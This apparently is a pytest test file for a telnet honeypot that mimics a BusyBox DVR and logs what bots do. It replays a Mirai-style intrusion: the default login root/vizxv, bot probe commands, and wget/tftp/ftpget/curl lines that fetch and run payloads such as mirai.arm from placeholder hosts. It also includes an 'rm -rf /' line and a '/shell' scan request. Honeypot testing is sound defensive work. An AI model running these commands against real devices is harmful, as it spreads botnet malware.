from __future__ import annotations

import asyncio
import contextlib

from suckerpot_common import EventType


async def test_banner_negotiation_and_prompt(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        await c.until(b"dvr-test login: ")
        # busybox telnetd opening: DO ECHO, DO NAWS, WILL ECHO, WILL SGA
        assert c.raw.startswith(bytes([255, 253, 1, 255, 253, 31, 255, 251, 1, 255, 251, 3]))
        assert b"honeypot" not in c.raw.lower()


async def test_mirai_session(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        await c.until(b"login: ")
        await c.send("root\r\n")
        await c.until(b"Password: ")
        await c.send("vizxv\r\n")
        motd = (await c.until(b" # ")).decode()
        assert "BusyBox v1.19.4" in motd and "built-in shell (ash)" in motd
        # the classic bot probe sequence
        assert "not found" in await c.run("enable")
        assert "not found" in await c.run("system")
        assert "not found" in await c.run("shell")
        assert await c.run("sh") == ""
        assert await c.run("linuxshell") == "sh: linuxshell: not found"
        assert await c.run("/bin/busybox ECCHI") == "ECCHI: applet not found"
        mounts = await c.run("cat /proc/mounts")
        assert "rootfs / rootfs" in mounts and "/dev/mtdblock3" in mounts
        assert await c.run("/bin/busybox echo -e '\\x41\\x42\\x43'") == "ABC"
        assert await c.run("echo -ne '\\x6b\\x61\\x6d' > .s; cat .s; echo") == "kam"
        assert await c.run("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; pwd") == "/tmp"
        assert await c.run(">.f && cat .f && echo ok && rm .f") == "ok"
        assert "BusyBox v1.19.4" in await c.run("busybox")
        out = await c.run("uname -a")
        assert out.startswith("Linux dvr-test 3.0.8 #1") and out.endswith("armv7l GNU/Linux")
        dl = await c.run(
            "wget http://198.51.100.7/bins/mirai.arm -O dvrHelper; chmod 777 dvrHelper"
        )
        assert "Connecting to 198.51.100.7 (198.51.100.7:80)" in dl and "100%" in dl
        assert await c.run("./dvrHelper telnet.arm") == ""  # starts silently
        assert "dvrHelper" in await c.run("ls")
        await c.run("tftp -g -l /tmp/t -r t.mips 203.0.113.9")
        await c.run("ftpget -v -u anonymous -p anonymous -P 21 192.0.2.44 f.bin f.bin")
        await c.run("curl -O http://198.51.100.8/x.sh")
        await c.send("exit\r\n")
        await c.read_all()

        events = await h.events()
        types = [e.type for e in events]
        assert types[0] == EventType.connect and types[-1] == EventType.disconnect
        logins = [e for e in events if e.type == EventType.login_attempt]
        assert [(e.data["username"], e.data["password"], e.data["success"]) for e in logins] == [
            ("root", "vizxv", True)
        ]
        assert logins[0].data["method"] == "telnet"
        cmds = [e.data["input"] for e in events if e.type == EventType.command]
        assert cmds[0] == "enable" and "/bin/busybox ECCHI" in cmds
        ecchi = next(e for e in events if e.data.get("input") == "/bin/busybox ECCHI")
        assert ecchi.data["output"].strip() == "ECCHI: applet not found"
        urls = [(e.data["tool"], e.data["url"]) for e in events if e.type == "download_attempt"]
        assert urls == [
            ("wget", "http://198.51.100.7/bins/mirai.arm"),
            ("tftp", "tftp://203.0.113.9:69/t.mips"),
            ("ftpget", "ftp://192.0.2.44:21/f.bin"),
            ("curl", "http://198.51.100.8/x.sh"),
        ]
        assert {e.dst_port for e in events} == {23}
        assert {e.sensor for e in events} == {"telnet"}
        bye = events[-1]
        assert bye.data["reason"] == "exit" and bye.data["commands"] == len(cmds)
        assert bye.data["downloads"] == 4
        frames = bye.data["replay"]
        text = "".join(f[2] for f in frames if f[1] == "o")
        assert "dvr-test login: root" in text and "Password: " in text and "vizxv" not in text
        assert any(f[1] == "i" for f in frames)


async def test_wrong_passwords_then_close(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_auth_attempts=3) as h:
        c = await h.connect()
        for pw in ("a", "b", "c"):
            await c.until(b"login: ")
            await c.send(f"root\r\n{pw}\r\n")
            await c.until(b"Login incorrect\r\n")
        rest = (await c.read_all())[c.pos :]
        assert b"login:" not in rest
        logins = await h.events("login_attempt")
        assert [e.data["password"] for e in logins] == ["a", "b", "c"]
        assert all(e.data["success"] is False for e in logins)
        disc = (await h.events("disconnect"))[0]
        assert disc.data["reason"] == "too many authentication failures"


async def test_pipelined_login_and_password_not_echoed(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        await c.send("admin\r\nadmin\r\nid\r\n")  # sent before the first prompt arrives
        out = await c.until(b"uid=")
        assert b"admin\r\n" in out and out.count(b"admin") == 1  # echoed once: the password is not
        await c.until(b" $ ")


async def test_line_editing(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.logged_in()
        await c.send("echoo\x7f hi\r\x00")  # backspace, CR NUL
        out = await c.until(b" # ")
        assert b"hi\r\n" in out
        await c.send("rm -rf /\x03")
        assert b"^C" in await c.until(b" # ")
        await c.send("\x1b[A\x1b[Bpwd\r\n")  # arrow keys are swallowed
        assert b"/root" in await c.until(b" # ")
        await c.send("\x04")  # Ctrl-D on an empty line ends the session
        await c.read_all()


async def test_options_are_answered_without_loops(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        await c.until(b"login: ")
        before = len(c.raw)
        # the client asks for options the server does not know, repeatedly; TTYPE and NAWS data
        flood = bytes([255, 251, 24, 255, 251, 24, 255, 253, 39, 255, 253, 39, 255, 251, 99] * 50)
        naws = bytes([255, 250, 31, 0, 120, 0, 40, 255, 240])
        ttype = bytes([255, 250, 24, 0]) + b"xterm-256color" + bytes([255, 240])
        await c.send(flood + naws + ttype)
        await asyncio.sleep(0.3)
        with contextlib.suppress(TimeoutError):
            c.raw += await asyncio.wait_for(c.reader.read(4096), 0.5)
        added = c.raw[before:]
        assert added == b""  # like BusyBox telnetd: negotiation is consumed, never answered
        await c.send("root\r\nvizxv\r\n")
        await c.until(b" # ")
        await c.send("exit\r\n")
        await c.read_all()
        connect = (await h.events("connect"))[0]
        assert connect.data["window"] == [120, 40]
        assert connect.data["terminal"] == "xterm-256color"
        assert "WILL TTYPE" in connect.data["client_options"]


async def test_raw_payload_scan_event(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        await c.until(b"login: ")
        await c.send("GET /shell?cd+/tmp HTTP/1.0\r")  # no full line: never a login attempt
        await c.close()
        scans = await h.events("scan")
        assert len(scans) == 1 and scans[0].data["kind"] == "raw_payload"
        assert bytes.fromhex(scans[0].data["payload_preview"]).startswith(b"GET /shell")
        assert await h.events("connect") == []


async def test_connection_without_data_is_only_summarised(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        await c.until(b"login: ")
        await c.close()
        await asyncio.sleep(0.2)
        assert await h.events() == []
        assert h.sink.stats()["summary_pending"] == 1
        assert h.sink.flush_summaries() == 1
        (scan,) = await h.events("scan")
        assert scan.data["kind"] == "connection_summary" and scan.data["count"] == 1


async def test_non_root_user_prompt_and_unknown_user(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(accept_random_prob=1.0) as h:
        c = await h.logged_in("Bob Smith", "whatever", b" $ ")  # any password, sanitised user
        assert await c.run("whoami", b" $ ") == "BobSmith"
        assert (await c.run("id", b" $ ")).startswith("uid=1")


async def test_elf_header_for_architecture_detection(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.logged_in()
        await c.send("cat /bin/echo | head -c 20\r\n")
        out = await c.until(b" # ")
        body = out.split(b"\r\n", 1)[1]
        assert body.startswith(b"\x7fELF\x01\x01\x01")
        assert body[18:20] == b"\x28\x00"  # EM_ARM


async def test_router_personality(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(personality="router") as h:
        c = await h.logged_in()
        assert (await c.run("uname -m")) == "mips"
        assert "MIPS 74Kc" in await c.run("cat /proc/cpuinfo")
        assert "tmpfs /tmp" in await c.run("cat /proc/mounts")


async def test_healthcheck_passes_and_is_silent(make_harness, monkeypatch) -> None:  # type: ignore[no-untyped-def]
    from telnet_sensor import healthcheck

    async with make_harness(quiet_loopback=True) as h:
        monkeypatch.setenv("TELNET_PORT", str(h.port))
        assert await asyncio.to_thread(healthcheck.main) == 0
        await asyncio.sleep(0.2)
        assert await h.events() == [] and h.sink.stats()["summary_pending"] == 0
    monkeypatch.setenv("TELNET_PORT", "1")
    assert await asyncio.to_thread(healthcheck.main) == 1
